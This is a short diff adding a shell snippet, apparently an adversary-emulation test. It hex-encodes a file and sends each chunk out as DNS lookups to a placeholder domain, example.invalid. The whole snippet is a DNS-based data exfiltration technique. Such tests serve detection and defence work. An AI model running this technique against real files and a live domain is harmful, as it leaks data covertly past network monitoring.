@@ -1,0 +1,4 @@
+xxd -p /tmp/atomic-input.txt > /tmp/atomic-encoded-data.hex
+for data in $(cat /tmp/atomic-encoded-data.hex); do
+  dig "$data.example.invalid"
+done
